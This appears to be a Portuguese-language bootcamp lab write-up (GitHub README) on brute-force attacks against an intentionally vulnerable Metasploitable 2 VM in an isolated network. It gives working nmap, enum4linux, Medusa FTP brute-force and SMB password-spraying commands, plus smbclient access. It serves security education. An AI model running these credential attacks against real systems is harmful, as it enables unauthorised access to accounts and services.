# ataque_bruteforce
Desafio Bootcamp Cibersegurança DIO
1. Introdução
Este desafio prático tem como objetivo simular cenários reais de ataques de força bruta, utilizando o Kali Linux em conjunto com a ferramenta Medusa e ambientes intencionalmente vulneráveis, como o Metasploitable 2 e o DVWA (Damn Vulnerable Web Application). A proposta central é implementar, documentar e compartilhar todo o processo, desde a configuração do ambiente com máquinas virtuais em rede interna até a execução de ataques simulados a serviços como FTP, formulários web e SMB. Por meio da criação de wordlists, aplicação de comandos específicos e validação de acessos obtidos, o exercício busca ilustrar técnicas ofensivas comuns e, em contrapartida, exercitar e recomendar medidas de prevenção e mitigação eficazes.
2. Objetivos
•	Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB);
•	Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado;
•	Documentar processos técnicos de forma clara e estruturada;
•	Reconhecer vulnerabilidades comuns e propor medidas de mitigação;
•	Utilizar o GitHub como portfólio técnico para compartilhar documentação e evidências.

3. Materiais e Métodos Ferramentas Utilizadas:

•	Kali Linux como máquina de ataque;
•	Metasploitable 2 como máquina alvo;
•	Rede Host-Only configurada no Virtual Box para comunicação direta e segura entre as Máquinas Virtuais;
4. Procedimentos
4.1 Enumeração de Serviços
O primeiro procedimento foi utilizar o Nmap para descobrir os serviços ativos na máquina alvo, onde foram identificadas que as portas de FTP, SSH, HTTP, SMB estavam abertas definindo assim nossos vetores de ataques.
nmap -sV -p 21,22,80,139,445  192.168.56.101 
4.1 Ataques de força bruta FTP
Após a varredura e verificado que o serviço FTP (vsftpd 2.3.4) estava vulnerável, utilizamos o medusa para realizar tentativas automatizadas de login.
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

4.2 Técnica de Password Sprayng no SMB
Através do comando enum4linux, foram identificadas contas do sistemas alvo que utilizavam o servido smb e em seguida foi usado o medusa com a técnica password sprayng contra o serviço.
enum4linux -a 192.168.56.101 | tee enum4_output.txt
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" senhas_spray.txt
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
Após isso testamos o acesso com smbclient e obtemos acesso
smbclient -L //192.168.56.101 -U msfadmin
5. Resultados da aprendizagem
Ambiente Isolado: Use VirtualBox com rede "Host-Only" para criar um ambiente de teste seguro e isolado da internet.
Ferramentas de Pentest: Pratique com ferramentas como Nmap, Medusa, Enum4Linux apenas dentro do laboratório.
Ciclo do Ataque: Entenda as fases: Reconhecimento, Exploração , Documentação .
6. Conclusão
Em conclusão, este trabalho permitiu a compreensão prática de como os ataques de força bruta são realizados contra serviços como FTP, Web e SMB. Através da utilização do Kali Linux e da ferramenta Medusa em um ambiente controlado, foi possível realizar uma auditoria de segurança, identificando vulnerabilidades comuns e propondo medidas de mitigação essenciais, como políticas de senha robustas e autenticação multifator. Além disso, a documentação clara e estruturada do processo, compartilhada no GitHub, serviu não apenas como evidência do trabalho, mas também como um valioso registro para o portfólio técnico, reforçando a importância de unir a prática técnica à capacidade de comunicá-la de forma eficaz. 


